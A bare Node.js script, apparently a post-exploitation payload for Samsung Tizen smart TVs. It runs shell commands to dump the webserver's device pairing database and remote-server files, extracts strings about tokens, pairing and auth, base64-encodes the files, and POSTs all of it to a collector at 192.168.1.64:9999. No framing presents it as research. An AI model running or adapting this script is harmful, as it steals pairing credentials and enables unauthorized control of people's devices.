"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

function post(path, body, cb) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { res.resume(); console.log("posted " + path + " " + res.statusCode); if (cb) cb(null); });
    req.on("error", function (e) { console.log("post err " + path + " " + e.message); if (cb) cb(e); });
    req.write(data);
    req.end();
}

function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 25000 }).slice(0, cap || 10000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

function stringsOf(buf, minLen) {
    var out = [];
    var cur = "";
    for (var i = 0; i < buf.length; i++) {
        var c = buf[i];
        if (c >= 32 && c < 127) cur += String.fromCharCode(c);
        else { if (cur.length >= (minLen || 5)) out.push(cur); cur = ""; }
    }
    return out;
}

var out = {};
out.started = new Date().toISOString();
out.id = sh("id | head -c 120");
out.pairings = sh("ls -la /opt/usr/apps/org.tizen.webserver/data/db/ 2>&1; base64 /opt/usr/apps/org.tizen.webserver/data/db/.pairings.db 2>/dev/null | head -c 2500");
out.msf_ls = sh("ls -laR /usr/apps/msf-server /usr/apps/remote-server 2>&1 | head -60");
out.data_find = sh("find /usr/apps/msf-server /usr/apps/remote-server /opt/usr/apps/remote-server -type f -size -3M 2>/dev/null | head -25");
post("/tok3", out);

var pull = {};
pull.started = out.started;
var files = out.data_find.split("\n");
var got = [];
for (var i = 0; i < files.length && got.length < 15; i++) {
    var p = files[i].trim();
    if (p.indexOf("/") !== 0) continue;
    try {
        var st = fs.statSync(p);
        if (st.size > 2500000) continue;
        var buf = fs.readFileSync(p);
        var strs = stringsOf(buf, 6);
        var rx = /(token|pair|auth|device|remote|allow)/i;
        var keep = [];
        for (var s = 0; s < strs.length && keep.length < 25; s++) {
            if (rx.test(strs[s])) keep.push(strs[s].slice(0, 120));
        }
        got.push({ path: p, size: st.size, hits: keep, b64: st.size < 300000 ? buf.toString("base64") : undefined });
    } catch (e) {
        got.push({ path: p, err: String(e.message || e) });
    }
}
pull.files = got;
post("/tok4", pull);
post("/tok_done2", { started: out.started });
